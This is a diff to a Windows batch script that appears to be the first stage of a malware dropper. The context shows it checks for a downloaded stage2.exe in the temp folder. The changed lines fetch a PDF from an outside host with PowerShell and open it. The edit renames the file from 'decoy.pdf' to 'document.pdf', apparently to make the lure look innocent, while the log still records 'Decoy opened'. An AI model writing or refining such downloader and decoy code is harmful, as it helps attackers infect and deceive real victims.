@@ -21,7 +21,7 @@ if exist %TEMP%\stage2.exe (
     echo [✗] Download failed
     echo %date% %time% - Download failed >> %TEMP%\stage1_log.txt
 )
-echo [2] Opening decoy.pdf...
-echo %date% %time% - Downloading decoy.pdf >> %TEMP%\stage1_log.txt
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://domenca.vercel.app/generated/decoy.pdf', 'decoy.pdf')" && start decoy.pdf
+echo [2] Opening document.pdf...
+echo %date% %time% - Downloading document.pdf >> %TEMP%\stage1_log.txt
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://domenca.vercel.app/generated/document.pdf', 'document.pdf')" && start document.pdf
 echo %date% %time% - Decoy opened >> %TEMP%\stage1_log.txt
